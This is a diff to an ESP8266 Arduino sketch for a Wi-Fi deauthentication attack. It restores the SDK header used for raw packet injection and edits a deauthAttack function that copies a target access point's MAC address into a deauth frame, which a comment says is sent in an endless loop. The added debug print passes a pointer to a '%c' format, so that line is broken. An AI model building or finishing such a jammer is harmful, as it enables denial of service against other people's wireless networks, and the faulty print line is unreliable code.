@@ -1,29 +1,8 @@
 #include <ESP8266WiFi.h>
 
-// #ifndef DNS_FOUND_CALLBACK_DEFINED
-// #define DNS_FOUND_CALLBACK_DEFINED
-
-// extern "C" {
-// #include "user_interface.h"
-// #include "lwip/opt.h"
-// #include "lwip/igmp.h"
-// #include "ets_sys.h"
-// #include "osapi.h"
-// #include "espconn.h"
-// }
-
-/*
-  #include "user_interface.h"
-  #include "lwip/opt.h"
-  #include "lwip/igmp.h"
-  #include "ets_sys.h"
-  #include "osapi.h"
-  #include "user_interface.h"
-  #include "espconn.h"
+extern "C" {
+#include "user_interface.h"
 }
-*/
-
-//#endif // DNS_FOUND_CALLBACK_DEFINED
 
 #define NUMNET 30
 
@@ -62,7 +41,9 @@ void deauthAttack(char* ap) {
   for (int i = 0; i < 6; i++) {
     packet[10 + i] = strtol(&ap[i * 3], NULL, 16);
     packet[16 + i] = strtol(&ap[i * 3], NULL, 16);
+    Serial.printf("%c ", &ap+ i * 3);
   }
+
 
   // Send the packet in a loop
   while (true) {
